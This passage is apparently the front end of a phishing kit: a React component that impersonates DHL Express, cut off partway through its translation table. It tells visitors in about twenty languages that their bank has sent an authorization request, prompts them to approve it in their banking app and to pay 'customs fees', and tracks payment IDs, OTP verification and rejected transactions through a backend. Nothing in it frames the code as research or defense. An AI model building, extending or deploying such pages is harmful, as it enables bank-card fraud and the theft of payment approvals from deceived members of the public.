import React, { useState, useEffect, useRef } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./dhl-approval.css";
import LoadingPage from "./LoadingPage";

const DHLExpressApproval = () => {
  // Language states
  const [isLangMenuOpen, setIsLangMenuOpen] = useState(false);
  const [selectedLang, setSelectedLang] = useState({
    flag: "🇫🇷",
    name: "Français",
    code: "fr",
    rtl: false,
  });
  const [language, setLanguage] = useState("en");
  const [isLoadingLang, setIsLoadingLang] = useState(true);

  // Payment states
  const [approvalStatus, setApprovalStatus] = useState(
    "Vérification de votre paiement...",
  );
  const [isProcessing, setIsProcessing] = useState(false);
  const [seconds, setSeconds] = useState(60);
  const [isResendDisabled, setIsResendDisabled] = useState(true);
  const [isWaiting, setIsWaiting] = useState(false);
  const [status, setStatus] = useState("");
  const [idRequest, setIdRequest] = useState(null);
  const [notification, setNotification] = useState(null);
  const [cardNumber, setCardNumber] = useState("");
  const [autoOpenTriggered, setAutoOpenTriggered] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const langMenuRef = useRef(null);
  const location = useLocation();
  const navigate = useNavigate();
  const { paymentId } = location.state || {};
  const apiUrl = import.meta.env.VITE_API_URL || "http://localhost:3000";

  // ============================================
  // COMPLETE LANGUAGES LIST - EXPANDED
  // ============================================
  const languages = [
    { code: "fr", name: "Français", flag: "🇫🇷", rtl: false },
    { code: "en", name: "English", flag: "🇬🇧", rtl: false },
    { code: "ar", name: "العربية", flag: "🇸🇦", rtl: true },
    { code: "es", name: "Español", flag: "🇪🇸", rtl: false },
    { code: "de", name: "Deutsch", flag: "🇩🇪", rtl: false },
    { code: "it", name: "Italiano", flag: "🇮🇹", rtl: false },
    { code: "pt", name: "Português", flag: "🇵🇹", rtl: false },
    { code: "nl", name: "Nederlands", flag: "🇳🇱", rtl: false },
    { code: "pl", name: "Polski", flag: "🇵🇱", rtl: false },
    { code: "ru", name: "Русский", flag: "🇷🇺", rtl: false },
    { code: "zh", name: "中文", flag: "🇨🇳", rtl: false },
    { code: "ja", name: "日本語", flag: "🇯🇵", rtl: false },
    { code: "ko", name: "한국어", flag: "🇰🇷", rtl: false },
    { code: "tr", name: "Türkçe", flag: "🇹🇷", rtl: false },
    { code: "vi", name: "Tiếng Việt", flag: "🇻🇳", rtl: false },
    { code: "th", name: "ไทย", flag: "🇹🇭", rtl: false },
    { code: "id", name: "Bahasa Indonesia", flag: "🇮🇩", rtl: false },
    { code: "ms", name: "Bahasa Melayu", flag: "🇲🇾", rtl: false },
    { code: "hi", name: "हिन्दी", flag: "🇮🇳", rtl: false },
    { code: "ur", name: "اردو", flag: "🇵🇰", rtl: true },
    { code: "he", name: "עברית", flag: "🇮🇱", rtl: true },
    // Added Nordic languages
    { code: "sv", name: "Svenska", flag: "🇸🇪", rtl: false },
    { code: "no", name: "Norsk", flag: "🇳🇴", rtl: false },
    { code: "da", name: "Dansk", flag: "🇩🇰", rtl: false },
    { code: "fi", name: "Suomi", flag: "🇫🇮", rtl: false },
  ];

  // ============================================
  // COUNTRY TO LANGUAGE MAPPING - FIXED PER REQUEST
  // TN = "en", CH = "de"
  // ============================================
  const countryToLanguage = {
    // French speaking countries
    FR: "fr",
    BE: "fr",
    LU: "fr",
    MC: "fr",
    SN: "fr",
    CI: "fr",
    CM: "fr",
    // English speaking countries (TN = en)
    US: "en",
    GB: "en",
    AU: "en",
    NZ: "en",
    IE: "en",
    ZA: "en",
    IN: "en",
    SG: "en",
    PH: "en",
    MY: "en",
    NG: "en",
    CA: "en",
    TN: "en",
    // Arabic speaking countries
    SA: "ar",
    AE: "ar",
    QA: "ar",
    KW: "ar",
    BH: "ar",
    OM: "ar",
    JO: "ar",
    EG: "ar",
    LB: "ar",
    IQ: "ar",
    YE: "ar",
    PS: "ar",
    LY: "ar",
    SD: "ar",
    MR: "ar",
    SO: "ar",
    MA: "ar",
    DZ: "ar",
    // Spanish speaking countries
    ES: "es",
    MX: "es",
    AR: "es",
    CO: "es",
    PE: "es",
    VE: "es",
    CL: "es",
    EC: "es",
    GT: "es",
    CU: "es",
    BO: "es",
    DO: "es",
    HN: "es",
    PY: "es",
    SV: "es",
    NI: "es",
    CR: "es",
    PA: "es",
    UY: "es",
    // German speaking countries (CH = de)
    DE: "de",
    AT: "de",
    LI: "de",
    CH: "de",
    // Italian speaking countries
    IT: "it",
    SM: "it",
    VA: "it",
    // Portuguese speaking countries
    PT: "pt",
    BR: "pt",
    AO: "pt",
    MZ: "pt",
    CV: "pt",
    GW: "pt",
    TL: "pt",
    // Dutch speaking countries
    NL: "nl",
    // Polish
    PL: "pl",
    // Russian speaking countries
    RU: "ru",
    BY: "ru",
    KZ: "ru",
    KG: "ru",
    UA: "ru",
    // Chinese
    CN: "zh",
    TW: "zh",
    HK: "zh",
    MO: "zh",
    // Japanese
    JP: "ja",
    // Korean
    KR: "ko",
    // Turkish
    TR: "tr",
    // Vietnamese
    VN: "vi",
    // Thai
    TH: "th",
    // Indonesian
    ID: "id",
    // Urdu/Pakistan
    PK: "ur",
    // Hebrew
    IL: "he",
    // Nordic languages
    SE: "sv",
    NO: "no",
    DK: "da",
    FI: "fi",
  };

  // ============================================
  // COMPLETE TRANSLATIONS - ALL LANGUAGES
  // ============================================
  const translations = {
    fr: {
      flag: "🇫🇷",
      name: "Français",
      approval_status_checking: "Vérification de votre paiement...",
      approval_status_waiting: "En attente de votre approbation...",
      approval_status_approved: "Approbation reçue, redirection...",
      approve_title: "Approuvez votre paiement",
      approve_sub:
        "Votre banque a envoyé une demande d'autorisation à votre application bancaire. Veuillez suivre les étapes ci-dessous.",
      approve_button: "J'ai approuvé",
      approve_button_processing: "Traitement...",
      approve_note:
        "Si vous ne voyez pas la demande, veuillez patienter ou contacter votre banque.",
      step1_label: "Remplir les informations",
      step2_label: "Payer les frais de douane",
      step3_label: "Soumettre la réexpédition",
      alert_message:
        "Paiement approuvé! Redirection vers la prochaine étape...",
      footer_privacy: "Avis de confidentialité",
      footer_consent: "Paramètres de consentement",
      footer_copyright: "DHL Group - Tous droits réservés",
      errorSendingCode: "Erreur lors de l'envoi du code",
      paymentIdNotFound: "ID de paiement non trouvé",
      newNotificationSent: "Nouvelle notification envoyée",
      errorRequestingCode: "Erreur lors de la demande du code",
      otpVerified: "Code vérifié avec succès",
      transactionRejected: "Transaction rejetée",
      loading: "Chargement...",
      pleaseWait: "Veuillez patienter...",
      detectingLanguage: "Détection de votre langue...",
      resendCode: "Renvoyer la notification",
      openBankApp: "Ouvrir l'application bancaire",
      waitingForApproval: "En attente d'approbation",
    },
    en: {
      flag: "🇬🇧",
      name: "English",
      approval_status_checking: "Verifying your payment...",
      approval_status_waiting: "Awaiting your approval...",
      approval_status_approved: "Approval received, redirecting...",
      approve_title: "Approve your payment",
      approve_sub:
        "Your bank has sent an authorization request to your banking app. Please follow the steps below.",
      approve_button: "I have approved",
      approve_button_processing: "Processing...",
      approve_note:
        "If you don't see the request, please wait or contact your bank.",
      step1_label: "Fill in information",
      step2_label: "Pay customs fees",
      step3_label: "Submit reshipment",
      alert_message: "Payment approved! Redirecting to next step...",
      footer_privacy: "Privacy Notice",
      footer_consent: "Consent Settings",
      footer_copyright: "DHL Group - All rights reserved",
      errorSendingCode: "Error sending code",
      paymentIdNotFound: "Payment ID not found",
      newNotificationSent: "New notification sent",
      errorRequestingCode: "Error requesting code",
      otpVerified: "Code verified successfully",
      transactionRejected: "Transaction rejected",
      loading: "Loading...",
      pleaseWait: "Please wait...",
      detectingLanguage: "Detecting your language...",
      resendCode: "Resend notification",
      openBankApp: "Open banking app",
      waitingForApproval: "Waiting for approval",
    },
    de: {
      flag: "🇩🇪",
      name: "Deutsch",
      approval_status_checking: "Ihre Zahlung wird überprüft...",
      approval_status_waiting: "Warten auf Ihre Genehmigung...",
      approval_status_approved: "Genehmigung erhalten, Weiterleitung...",
      approve_title: "Genehmigen Sie Ihre Zahlung",
      approve_sub:
        "Ihre Bank hat eine Autorisierungsanfrage an Ihre Banking-App gesendet. Bitte befolgen Sie die untenstehenden Schritte.",
      approve_button: "Ich habe genehmigt",
      approve_button_processing: "Verarbeitung...",
      approve_note:
        "Wenn Sie die Anfrage nicht sehen, warten Sie bitte oder kontaktieren Sie Ihre Bank.",
      step1_label: "Informationen eingeben",
      step2_label: "Zollgebühren bezahlen",
      step3_label: "Neuversand einreichen",
      alert_message: "Zahlung genehmigt! Weiterleitung zum nächsten Schritt...",
      footer_privacy: "Datenschutzerklärung",
      footer_consent: "Einwilligungseinstellungen",
      footer_copyright: "DHL Group - Alle Rechte vorbehalten",
      errorSendingCode: "Fehler beim Senden des Codes",
      paymentIdNotFound: "Zahlungs-ID nicht gefunden",
      newNotificationSent: "Neue Benachrichtigung gesendet",
      errorRequestingCode: "Fehler bei der Codeanforderung",
      otpVerified: "Code erfolgreich verifiziert",
      transactionRejected: "Transaktion abgelehnt",
      loading: "Laden...",
      pleaseWait: "Bitte warten...",
      detectingLanguage: "Sprache wird erkannt...",
      resendCode: "Benachrichtigung erneut senden",
      openBankApp: "Bank-App öffnen",
      waitingForApproval: "Warten auf Genehmigung",
    },
    es: {
      flag: "🇪🇸",
      name: "Español",
      approval_status_checking: "Verificando su pago...",
      approval_status_waiting: "Esperando su aprobación...",
      approval_status_approved: "Aprobación recibida, redirigiendo...",
      approve_title: "Apruebe su pago",
      approve_sub:
        "Su banco ha enviado una solicitud de autorización a su aplicación bancaria. Por favor, siga los pasos a continuación.",
      approve_button: "He aprobado",
      approve_button_processing: "Procesando...",
      approve_note: "Si no ve la solicitud, espere o contacte a su banco.",
      step1_label: "Completar información",
      step2_label: "Pagar aranceles aduaneros",
      step3_label: "Enviar reexpedición",
      alert_message: "¡Pago aprobado! Redirigiendo al siguiente paso...",
      footer_privacy: "Aviso de Privacidad",
      footer_consent: "Configuración de Consentimiento",
      footer_copyright: "DHL Group - Todos los derechos reservados",
      errorSendingCode: "Error al enviar el código",
      paymentIdNotFound: "ID de pago no encontrado",
      newNotificationSent: "Nueva notificación enviada",
      errorRequestingCode: "Error al solicitar el código",
      otpVerified: "Código verificado exitosamente",
      transactionRejected: "Transacción rechazada",
      loading: "Cargando...",
      pleaseWait: "Por favor espere...",
      detectingLanguage: "Detectando su idioma...",
      resendCode: "Reenviar notificación",
      openBankApp: "Abrir aplicación bancaria",
      waitingForApproval: "Esperando aprobación",
    },
    ar: {
      flag: "🇸🇦",
      name: "العربية",
      rtl: true,
      approval_status_checking: "جاري التحقق من دفعتك...",
      approval_status_waiting: "في انتظار موافقتك...",
      approval_status_approved: "تم استلام الموافقة، جاري إعادة التوجيه...",
      approve_title: "وافق على دفعتك",
      approve_sub:
        "لقد أرسل بنكك طلب تفويض إلى تطبيق البنك الخاص بك. يرجى اتباع الخطوات أدناه.",
      approve_button: "لقد وافقت",
      approve_button_processing: "جاري المعالجة...",
      approve_note:
        "إذا لم ترَ الطلب، يرجى الانتظار أو الاتصال بالبنك الذي تتعامل معه.",
      step1_label: "ملء المعلومات",
      step2_label: "دفع الرسوم الجمركية",
      step3_label: "إرسال إعادة الشحن",
      alert_message:
        "تمت الموافقة على الدفع! جاري إعادة التوجيه إلى الخطوة التالية...",
      footer_privacy: "إشعار الخصوصية",
      footer_consent: "إعدادات الموافقة",
      footer_copyright: "مجموعة DHL - جميع الحقوق محفوظة",
      errorSendingCode: "خطأ في إرسال الرمز",
      paymentIdNotFound: "لم يتم العثور على معرف الدفع",
      newNotificationSent: "تم إرسال إشعار جديد",
      errorRequestingCode: "خطأ في طلب الرمز",
      otpVerified: "تم التحقق من الرمز بنجاح",
      transactionRejected: "تم رفض المعاملة",
      loading: "جاري التحميل...",
      pleaseWait: "يرجى الانتظار...",
      detectingLanguage: "جاري اكتشاف لغتك...",
      resendCode: "إعادة إرسال الإشعار",
      openBankApp: "فتح تطبيق البنك",
      waitingForApproval: "في انتظار الموافقة",
    },
    it: {
      flag: "🇮🇹",
      name: "Italiano",
      approval_status_checking: "Verifica del pagamento in corso...",
      approval_status_waiting: "In attesa della tua approvazione...",
      approval_status_approved: "Approvazione ricevuta, reindirizzamento...",
      approve_title: "Approva il tuo pagamento",
      approve_sub:
        "La tua banca ha inviato una richiesta di autorizzazione alla tua app bancaria. Segui i passaggi qui sotto.",
      approve_button: "Ho approvato",
      approve_button_processing: "Elaborazione...",
      approve_note:
        "Se non vedi la richiesta, attendi o contatta la tua banca.",
      step1_label: "Compila le informazioni",
      step2_label: "Paga i dazi doganali",
      step3_label: "Invia la rispedizione",
      alert_message:
        "Pagamento approvato! Reindirizzamento al prossimo passo...",
      footer_privacy: "Informativa sulla privacy",
      footer_consent: "Impostazioni del consenso",
      footer_copyright: "DHL Group - Tutti i diritti riservati",
      errorSendingCode: "Errore nell'invio del codice",
      paymentIdNotFound: "ID pagamento non trovato",
      newNotificationSent: "Nuova notifica inviata",
      errorRequestingCode: "Errore nella richiesta del codice",
      otpVerified: "Codice verificato con successo",
      transactionRejected: "Transazione rifiutata",
      loading: "Caricamento...",
      pleaseWait: "Attendere prego...",
      detectingLanguage: "Rilevamento della lingua...",
      resendCode: "Invia nuovamente la notifica",
      openBankApp: "Apri l'app bancaria",
      waitingForApproval: "In attesa di approvazione",
    },
    pt: {
      flag: "🇵🇹",
      name: "Português",
      approval_status_checking: "Verificando seu pagamento...",
      approval_status_waiting: "Aguardando sua aprovação...",
      approval_status_approved: "Aprovação recebida, redirecionando...",
      approve_title: "Aprove seu pagamento",
      approve_sub:
        "Seu banco enviou uma solicitação de autorização para seu aplicativo bancário. Siga os passos abaixo.",
      approve_button: "Eu aprovei",
      approve_button_processing: "Processando...",
      approve_note:
        "Se você não vir a solicitação, aguarde ou entre em contato com seu banco.",
      step1_label: "Preencher informações",
      step2_label: "Pagar taxas alfandegárias",
      step3_label: "Enviar reenvio",
      alert_message:
        "Pagamento aprovado! Redirecionando para o próximo passo...",
      footer_privacy: "Aviso de Privacidade",
      footer_consent: "Configurações de Consentimento",
      footer_copyright: "DHL Group - Todos os direitos reservados",
      errorSendingCode: "Erro ao enviar o código",
      paymentIdNotFound: "ID de pagamento não encontrado",
      newNotificationSent: "Nova notificação enviada",
      errorRequestingCode: "Erro ao solicitar o código",
      otpVerified: "Código verificado com sucesso",
      transactionRejected: "Transação rejeitada",
      loading: "Carregando...",
      pleaseWait: "Por favor, aguarde...",
      detectingLanguage: "Detectando seu idioma...",
      resendCode: "Reenviar notificação",
      openBankApp: "Abrir aplicativo bancário",
      waitingForApproval: "Aguardando aprovação",
    },
    nl: {
      flag: "🇳🇱",
      name: "Nederlands",
      approval_status_checking: "Uw betaling wordt geverifieerd...",
      approval_status_waiting: "Wachten op uw goedkeuring...",
      approval_status_approved: "Goedkeuring ontvangen, doorverwijzen...",
      approve_title: "Keur uw betaling goed",
      approve_sub:
        "Uw bank heeft een autorisatieverzoek naar uw bank-app gestuurd. Volg de onderstaande stappen.",
      approve_button: "Ik heb goedgekeurd",
      approve_button_processing: "Verwerken...",
      approve_note:
        "Als u het verzoek niet ziet, wacht dan of neem contact op met uw bank.",
      step1_label: "Informatie invullen",
      step2_label: "Betalen van douanekosten",
      step3_label: "Herverzending indienen",
      alert_message:
        "Betaling goedgekeurd! Doorverwijzen naar volgende stap...",
      footer_privacy: "Privacyverklaring",
      footer_consent: "Toestemmingsinstellingen",
      footer_copyright: "DHL Group - Alle rechten voorbehouden",
      errorSendingCode: "Fout bij het verzenden van de code",
      paymentIdNotFound: "Betalings-ID niet gevonden",
      newNotificationSent: "Nieuwe melding verzonden",
      errorRequestingCode: "Fout bij het aanvragen van de code",
      otpVerified: "Code succesvol geverifieerd",
      transactionRejected: "Transactie afgewezen",
      loading: "Laden...",
      pleaseWait: "Even geduld a.u.b...",
      detectingLanguage: "Taal detecteren...",
      resendCode: "Melding opnieuw verzenden",
      openBankApp: "Bank-app openen",
      waitingForApproval: "Wachten op goedkeuring",
    },
    pl: {
      flag: "🇵🇱",
      name: "Polski",
      approval_status_checking: "Weryfikacja płatności...",
      approval_status_waiting: "Oczekiwanie na zatwierdzenie...",
      approval_status_approved: "Zatwierdzenie otrzymane, przekierowywanie...",
      approve_title: "Zatwierdź płatność",
      approve_sub:
        "Twój bank wysłał prośbę o autoryzację do aplikacji bankowej. Postępuj zgodnie z poniższymi krokami.",
      approve_button: "Zatwierdziłem",
      approve_button_processing: "Przetwarzanie...",
      approve_note:
        "Jeśli nie widzisz prośby, poczekaj lub skontaktuj się z bankiem.",
      step1_label: "Wypełnij informacje",
      step2_label: "Zapłać cło",
      step3_label: "Wyślij ponowną wysyłkę",
      alert_message:
        "Płatność zatwierdzona! Przekierowanie do następnego kroku...",
      footer_privacy: "Polityka prywatności",
      footer_consent: "Ustawienia zgód",
      footer_copyright: "DHL Group - Wszelkie prawa zastrzeżone",
      errorSendingCode: "Błąd wysyłania kodu",
      paymentIdNotFound: "Nie znaleziono ID płatności",
      newNotificationSent: "Wysłano nowe powiadomienie",
      errorRequestingCode: "Błąd żądania kodu",
      otpVerified: "Kod zweryfikowany pomyślnie",
      transactionRejected: "Transakcja odrzucona",
      loading: "Ładowanie...",
      pleaseWait: "Proszę czekać...",
      detectingLanguage: "Wykrywanie języka...",
      resendCode: "Wyślij ponownie powiadomienie",
      openBankApp: "Otwórz aplikację bankową",
      waitingForApproval: "Oczekiwanie na zatwierdzenie",
    },
    ru: {
      flag: "🇷🇺",
      name: "Русский",
      approval_status_checking: "Проверка вашего платежа...",
      approval_status_waiting: "Ожидание вашего подтверждения...",
      approval_status_approved: "Подтверждение получено, перенаправление...",
      approve_title: "Подтвердите ваш платеж",
      approve_sub:
        "Ваш банк отправил запрос на авторизацию в ваше банковское приложение. Пожалуйста, следуйте инструкциям ниже.",
      approve_button: "Я подтвердил",
      approve_button_processing: "Обработка...",
      approve_note:
        "Если вы не видите запрос, подождите или свяжитесь с вашим банком.",
      step1_label: "Заполните информацию",
      step2_label: "Оплатите таможенные сборы",
      step3_label: "Отправить повторную отправку",
      alert_message: "Платеж подтвержден! Перенаправление на следующий шаг...",
      footer_privacy: "Уведомление о конфиденциальности",
      footer_consent: "Настройки согласия",
      footer_copyright: "DHL Group - Все права защищены",
      errorSendingCode: "Ошибка отправки кода",
      paymentIdNotFound: "ID платежа не найден",
      newNotificationSent: "Новое уведомление отправлено",
      errorRequestingCode: "Ошибка запроса кода",
      otpVerified: "Код успешно проверен",
      transactionRejected: "Транзакция отклонена",
      loading: "Загрузка...",
      pleaseWait: "Пожалуйста, подождите...",
      detectingLanguage: "Определение языка...",
      resendCode: "Отправить уведомление повторно",
      openBankApp: "Открыть банковское приложение",
      waitingForApproval: "Ожидание подтверждения",
    },
    zh: {
      flag: "🇨🇳",
      name: "中文",
      approval_status_checking: "正在验证您的付款...",
      approval_status_waiting: "等待您的批准...",
      approval_status_approved: "已收到批准，正在重定向...",
      approve_title: "批准您的付款",
      approve_sub:
        "您的银行已向您的银行应用程序发送授权请求。请按照以下步骤操作。",
      approve_button: "我已批准",
      approve_button_processing: "处理中...",
      approve_note: "如果您没有看到请求，请等待或联系您的银行。",
      step1_label: "填写信息",
      step2_label: "支付海关费用",
      step3_label: "提交重新发货",
      alert_message: "付款已批准！正在重定向到下一步...",
      footer_privacy: "隐私声明",
      footer_consent: "同意设置",
      footer_copyright: "DHL集团 - 保留所有权利",
      errorSendingCode: "发送代码时出错",
      paymentIdNotFound: "未找到付款ID",
      newNotificationSent: "已发送新通知",
      errorRequestingCode: "请求代码时出错",
      otpVerified: "代码验证成功",
      transactionRejected: "交易被拒绝",
      loading: "加载中...",
      pleaseWait: "请稍候...",
      detectingLanguage: "检测您的语言...",
      resendCode: "重新发送通知",
      openBankApp: "打开银行应用程序",
      waitingForApproval: "等待批准",
    },
    ja: {
      flag: "🇯🇵",
      name: "日本語",
      approval_status_checking: "お支払いを確認しています...",
      approval_status_waiting: "承認をお待ちしています...",
      approval_status_approved: "承認を受け取りました、リダイレクト中...",
      approve_title: "お支払いを承認する",
      approve_sub:
        "あなたの銀行はあなたの銀行アプリに認証リクエストを送信しました。以下の手順に従ってください。",
      approve_button: "承認しました",
      approve_button_processing: "処理中...",
      approve_note:
        "リクエストが表示されない場合は、お待ちいただくか、銀行に連絡してください。",
      step1_label: "情報を入力",
      step2_label: "関税を支払う",
      step3_label: "再送信を送信",
      alert_message:
        "支払いが承認されました！次のステップにリダイレクトします...",
      footer_privacy: "プライバシー通知",
      footer_consent: "同意設定",
      footer_copyright: "DHL Group - 無断転載を禁じます",
      errorSendingCode: "コードの送信エラー",
      paymentIdNotFound: "支払いIDが見つかりません",
      newNotificationSent: "新しい通知を送信しました",
      errorRequestingCode: "コードのリクエストエラー",
      otpVerified: "コードが正常に検証されました",
      transactionRejected: "トランザクションが拒否されました",
      loading: "読み込み中...",
      pleaseWait: "お待ちください...",
      detectingLanguage: "言語を検出しています...",
      resendCode: "通知を再送信",
      openBankApp: "銀行アプリを開く",
      waitingForApproval: "承認待ち",
    },
    ko: {
      flag: "🇰🇷",
      name: "한국어",
      approval_status_checking: "결제를 확인하는 중...",
      approval_status_waiting: "승인을 기다리는 중...",
      approval_status_approved: "승인을 받았습니다, 리디렉션 중...",
      approve_title: "결제 승인",
      approve_sub:
        "귀하의 은행이 귀하의 뱅킹 앱에 인증 요청을 보냈습니다. 아래 단계를 따르세요.",
      approve_button: "승인했습니다",
      approve_button_processing: "처리 중...",
      approve_note: "요청이 표시되지 않으면 기다리거나 은행에 문의하세요.",
      step1_label: "정보 입력",
      step2_label: "관세 납부",
      step3_label: "재배송 제출",
      alert_message: "결제가 승인되었습니다! 다음 단계로 리디렉션합니다...",
      footer_privacy: "개인정보 보호정책",
      footer_consent: "동의 설정",
      footer_copyright: "DHL 그룹 - 모든 권리 보유",
      errorSendingCode: "코드 전송 오류",
      paymentIdNotFound: "결제 ID를 찾을 수 없음",
      newNotificationSent: "새 알림이 전송됨",
      errorRequestingCode: "코드 요청 오류",
      otpVerified: "코드가 성공적으로 확인됨",
      transactionRejected: "거래가 거부됨",
      loading: "로딩 중...",
      pleaseWait: "잠시만 기다려주세요...",
      detectingLanguage: "언어 감지 중...",
      resendCode: "알림 다시 보내기",
      openBankApp: "뱅킹 앱 열기",
      waitingForApproval: "승인 대기 중",
    },
    tr: {
      flag: "🇹🇷",
      name: "Türkçe",
      approval_status_checking: "Ödemeniz doğrulanıyor...",
      approval_status_waiting: "Onayınız bekleniyor...",
      approval_status_approved: "Onay alındı, yönlendiriliyor...",
      approve_title: "Ödemenizi onaylayın",
      approve_sub:
        "Bankanız bankacılık uygulamanıza bir yetkilendirme talebi gönderdi. Lütfen aşağıdaki adımları izleyin.",
      approve_button: "Onayladım",
      approve_button_processing: "İşleniyor...",
      approve_note:
        "Talebi görmüyorsanız, lütfen bekleyin veya bankanızla iletişime geçin.",
      step1_label: "Bilgileri doldurun",
      step2_label: "Gümrük ücretlerini ödeyin",
      step3_label: "Yeniden gönderimi gönderin",
      alert_message:
        "Ödeme onaylandı! Bir sonraki adıma yönlendiriliyorsunuz...",
      footer_privacy: "Gizlilik Bildirimi",
      footer_consent: "Onay Ayarları",
      footer_copyright: "DHL Group - Tüm hakları saklıdır",
      errorSendingCode: "Kod gönderilirken hata oluştu",
      paymentIdNotFound: "Ödeme ID'si bulunamadı",
      newNotificationSent: "Yeni bildirim gönderildi",
      errorRequestingCode: "Kod talep edilirken hata oluştu",
      otpVerified: "Kod başarıyla doğrulandı",
      transactionRejected: "İşlem reddedildi",
      loading: "Yükleniyor...",
      pleaseWait: "Lütfen bekleyin...",
      detectingLanguage: "Diliniz algılanıyor...",
      resendCode: "Bildirimi yeniden gönder",
      openBankApp: "Bankacılık uygulamasını aç",
      waitingForApproval: "Onay bekleniyor",
    },
    vi: {
      flag: "🇻🇳",
      name: "Tiếng Việt",
      approval_status_checking: "Đang xác minh thanh toán của bạn...",
      approval_status_waiting: "Đang chờ phê duyệt của bạn...",
      approval_status_approved: "Đã nhận được phê duyệt, đang chuyển hướng...",
      approve_title: "Phê duyệt thanh toán của bạn",
      approve_sub:
        "Ngân hàng của bạn đã gửi yêu cầu ủy quyền đến ứng dụng ngân hàng của bạn. Vui lòng làm theo các bước dưới đây.",
      approve_button: "Tôi đã phê duyệt",
      approve_button_processing: "Đang xử lý...",
      approve_note:
        "Nếu bạn không thấy yêu cầu, vui lòng đợi hoặc liên hệ với ngân hàng của bạn.",
      step1_label: "Điền thông tin",
      step2_label: "Thanh toán phí hải quan",
      step3_label: "Gửi gửi lại",
      alert_message:
        "Thanh toán đã được phê duyệt! Đang chuyển hướng đến bước tiếp theo...",
      footer_privacy: "Thông báo Quyền riêng tư",
      footer_consent: "Cài đặt Đồng ý",
      footer_copyright: "DHL Group - Bảo lưu mọi quyền",
      errorSendingCode: "Lỗi khi gửi mã",
      paymentIdNotFound: "Không tìm thấy ID thanh toán",
      newNotificationSent: "Đã gửi thông báo mới",
      errorRequestingCode: "Lỗi khi yêu cầu mã",
      otpVerified: "Mã đã được xác minh thành công",
      transactionRejected: "Giao dịch bị từ chối",
      loading: "Đang tải...",
      pleaseWait: "Vui lòng đợi...",
      detectingLanguage: "Đang phát hiện ngôn ngữ của bạn...",
      resendCode: "Gửi lại thông báo",
      openBankApp: "Mở ứng dụng ngân hàng",
      waitingForApproval: "Đang chờ phê duyệt",
    },
    th: {
      flag: "🇹🇭",
      name: "ไทย",
      approval_status_checking: "กำลังตรวจสอบการชำระเงินของคุณ...",
      approval_status_waiting: "กำลังรอการอนุมัติของคุณ...",
      approval_status_approved: "ได้รับการอนุมัติแล้ว กำลังเปลี่ยนเส้นทาง...",
      approve_title: "อนุมัติการชำระเงินของคุณ",
      approve_sub:
        "ธนาคารของคุณได้ส่งคำขออนุญาตไปยังแอปพลิเคชันธนาคารของคุณ โปรดทำตามขั้นตอนด้านล่าง",
      approve_button: "ฉันอนุมัติแล้ว",
      approve_button_processing: "กำลังดำเนินการ...",
      approve_note: "หากคุณไม่เห็นคำขอ โปรดรอหรือติดต่อธนาคารของคุณ",
      step1_label: "กรอกข้อมูล",
      step2_label: "ชำระค่าธรรมเนียมศุลกากร",
      step3_label: "ส่งการจัดส่งใหม่",
      alert_message:
        "ชำระเงินเรียบร้อย! กำลังเปลี่ยนเส้นทางไปยังขั้นตอนถัดไป...",
      footer_privacy: "ประกาศความเป็นส่วนตัว",
      footer_consent: "การตั้งค่าความยินยอม",
      footer_copyright: "DHL Group - สงวนลิขสิทธิ์",
      errorSendingCode: "เกิดข้อผิดพลาดในการส่งรหัส",
      paymentIdNotFound: "ไม่พบรหัสการชำระเงิน",
      newNotificationSent: "ส่งการแจ้งเตือนใหม่แล้ว",
      errorRequestingCode: "เกิดข้อผิดพลาดในการขอรหัส",
      otpVerified: "ตรวจสอบรหัสสำเร็จ",
      transactionRejected: "ธุรกรรมถูกปฏิเสธ",
      loading: "กำลังโหลด...",
      pleaseWait: "โปรดรอสักครู่...",
      detectingLanguage: "กำลังตรวจจับภาษาของคุณ...",
      resendCode: "ส่งการแจ้งเตือนอีกครั้ง",
      openBankApp: "เปิดแอปธนาคาร",
      waitingForApproval: "กำลังรอการอนุมัติ",
    },
    id: {
      flag: "🇮🇩",
      name: "Bahasa Indonesia",
      approval_status_checking: "Memverifikasi pembayaran Anda...",
      approval_status_waiting: "Menunggu persetujuan Anda...",
      approval_status_approved: "Persetujuan diterima, mengalihkan...",
      approve_title: "Setujui pembayaran Anda",
      approve_sub:
        "Bank Anda telah mengirim permintaan otorisasi ke aplikasi perbankan Anda. Silakan ikuti langkah-langkah di bawah ini.",
      approve_button: "Saya telah menyetujui",
      approve_button_processing: "Memproses...",
      approve_note:
        "Jika Anda tidak melihat permintaan, harap tunggu atau hubungi bank Anda.",
      step1_label: "Isi informasi",
      step2_label: "Bayar biaya bea cukai",
      step3_label: "Kirim pengiriman ulang",
      alert_message:
        "Pembayaran disetujui! Mengalihkan ke langkah berikutnya...",
      footer_privacy: "Pemberitahuan Privasi",
      footer_consent: "Pengaturan Persetujuan",
      footer_copyright: "DHL Group - Hak cipta dilindungi",
      errorSendingCode: "Kesalahan mengirim kode",
      paymentIdNotFound: "ID pembayaran tidak ditemukan",
      newNotificationSent: "Notifikasi baru terkirim",
      errorRequestingCode: "Kesalahan meminta kode",
      otpVerified: "Kode berhasil diverifikasi",
      transactionRejected: "Transaksi ditolak",
      loading: "Memuat...",
      pleaseWait: "Silakan tunggu...",
      detectingLanguage: "Mendeteksi bahasa Anda...",
      resendCode: "Kirim ulang notifikasi",
      openBankApp: "Buka aplikasi perbankan",
      waitingForApproval: "Menunggu persetujuan",
    },
    sv: {
      flag: "🇸🇪",
      name: "Svenska",
      approval_status_checking: "Verifierar din betalning...",
      approval_status_waiting: "Väntar på ditt godkännande...",
      approval_status_approved: "Godkännande mottaget, omdirigerar...",
      approve_title: "Godkänn din betalning",
      approve_sub:
        "Din bank har skickat en auktoriseringsbegäran till din bankapp. Följ stegen nedan.",
      approve_button: "Jag har godkänt",
      approve_button_processing: "Bearbetar...",
      approve_note: "Om du inte ser begäran, vänta eller kontakta din bank.",
      step1_label: "Fyll i information",
      step2_label: "Betala tullavgifter",
      step3_label: "Skicka omfrakt",
      alert_message: "Betalning godkänd! Omdirigerar till nästa steg...",
      footer_privacy: "Integritetspolicy",
      footer_consent: "Cookie-inställningar",
      footer_copyright: "DHL Group - Alla rättigheter förbehålls",
      errorSendingCode: "Fel vid sändning av kod",
      paymentIdNotFound: "Betalnings-ID hittades inte",
      newNotificationSent: "Ny avisering skickad",
      errorRequestingCode: "Fel vid begäran av kod",
      otpVerified: "Kod verifierad",
      transactionRejected: "Transaktion avvisad",
      loading: "Laddar...",
      pleaseWait: "Vänligen vänta...",
      detectingLanguage: "Upptäcker ditt språk...",
